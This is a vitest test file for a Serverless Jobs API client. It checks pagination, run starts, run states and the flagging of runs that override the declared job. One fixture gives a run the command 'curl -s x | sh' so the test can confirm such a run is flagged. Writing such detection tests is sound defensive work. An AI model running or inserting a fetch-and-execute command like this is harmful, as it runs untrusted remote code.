import { describe, expect, it } from 'vitest';
import { mainJobDifferences } from '../status/providers/inventory';
import { runOverrides } from '../status/providers/runs';
import { findJobDefinition, listJobRuns, readJobDefinition, runEnded, startJobRun } from './job-runs';
import { declaredMainJob } from './main-job';

function fakeJobs(definitions: Array<{ id: string; name: string }>) {
  const requests: Array<{ method: string; url: string; body?: unknown }> = [];
  const fetchImpl = async (url: string, init?: { method?: string; body?: string }) => {
    requests.push({ method: init?.method ?? 'GET', url, body: init?.body ? JSON.parse(init.body) : undefined });
    const page = Number(new URL(url).searchParams.get('page') ?? '1');
    const body = url.includes('/start')
      ? { job_runs: [{ id: 'run-1', state: 'queued' }] }
      : { job_definitions: definitions.slice((page - 1) * 100, page * 100), total_count: definitions.length };
    return { ok: true, status: 200, text: async () => JSON.stringify(body) };
  };
  return { requests, auth: { secretKey: 'k', fetchImpl: fetchImpl as never } };
}

describe('the Serverless Jobs calls', () => {
  it('finds a definition by name across pages, and says when there is none', async () => {
    const definitions = Array.from({ length: 150 }, (_, i) => ({ id: `d${i}`, name: `job-${i}` }));
    const { auth } = fakeJobs(definitions);
    expect(await findJobDefinition(auth, { region: 'nl-ams', projectId: 'p', name: 'job-120' })).toBe('d120');
    expect(await findJobDefinition(auth, { region: 'nl-ams', projectId: 'p', name: 'cella-staging-main' })).toBeUndefined();
  });

  it('starts a run with its values in the start call', async () => {
    const { auth, requests } = fakeJobs([]);
    const run = await startJobRun(auth, { region: 'nl-ams', definitionId: 'd1', values: { TARGET_SHA: 'a'.repeat(40), RETRY: '0' } });
    expect(run.id).toBe('run-1');
    expect(requests[0]).toMatchObject({ method: 'POST', body: { environment_variables: { TARGET_SHA: 'a'.repeat(40), RETRY: '0' } } });
    expect(requests[0]?.url).toMatch(/\/serverless-jobs\/v1alpha2\/regions\/nl-ams\/job-definitions\/d1\/start$/);
  });

  it('knows when a run has ended', () => {
    expect(['succeeded', 'failed', 'interrupted'].every((state) => runEnded({ state }))).toBe(true);
    expect(['initialized', 'validated', 'queued', 'running', 'retrying', 'interrupting'].some((state) => runEnded({ state }))).toBe(false);
  });

  it("reads the main job's startup command and each run's, so a run started with its own is flagged (D-b, measured 2026-10-29)", async () => {
    const declared = declaredMainJob({
      mode: 'staging',
      projectId: 'p',
      organizationId: 'o',
      region: 'nl-ams',
      repository: 'https://github.com/example/app.git',
      nodeVersion: '26.12.1',
    });
    // As Scaleway answered: v1alpha1 gives the definition and every run an empty command and no startup command.
    const command = (url: string, startup_command: string[]) =>
      url.includes('/v1alpha2/') ? { command: '', startup_command, args: [] } : { command: '' };
    const values = { TARGET_SHA: 'a'.repeat(40), RETRY: '0' };
    const run = (url: string, id: string, startup_command: string[]) => ({
      id,
      state: 'running',
      created_at: '2026-10-29T00:00:00Z',
      environment_variables: { ...declared.env, ...values },
      ...command(url, startup_command),
    });
    const fetchImpl = async (url: string) => {
      const body = url.includes('/job-runs?')
        ? { total_count: 2, job_runs: [run(url, 'r2', ['sh', '-c', 'curl -s x | sh']), run(url, 'r1', declared.startupCommands)] }
        : {
            image_uri: declared.imageUri,
            environment_variables: declared.env,
            updated_at: '2026-10-28T00:00:00Z',
            ...command(url, declared.startupCommands),
          };
      return { ok: true, status: 200, text: async () => JSON.stringify(body) };
    };
    const auth = { secretKey: 'k', fetchImpl: fetchImpl as never };
    const definition = await readJobDefinition(auth, { region: 'nl-ams', definitionId: 'd1' });
    expect(mainJobDifferences({ running: false, ...definition }, declared)).toEqual([]);
    const runs = await listJobRuns(auth, { region: 'nl-ams', projectId: 'p', definitionId: 'd1' });
    expect(runs.map((run) => runOverrides(run, definition))).toEqual([['runs its own command'], []]);
  });

  it('compares a run only with a definition changed before it started, so an apply that changes a value flags no older run (seen 2026-10-29)', () => {
    const definition = { env: { DEPLOY_FOLDER: '/deploy' }, updatedAt: '2026-10-29T10:00:00Z' };
    const run = (created_at: string) => ({
      id: created_at,
      state: 'succeeded',
      created_at,
      environment_variables: { DEPLOY_FOLDER: '/cella-production/deploy', TARGET_SHA: 'a'.repeat(40), RETRY: '0' },
    });
    expect(runOverrides(run('2026-10-29T09:00:00Z'), definition)).toEqual([]);
    expect(runOverrides(run('2026-10-29T11:00:00Z'), definition)).toEqual(['sets DEPLOY_FOLDER to another value']);
  });
});
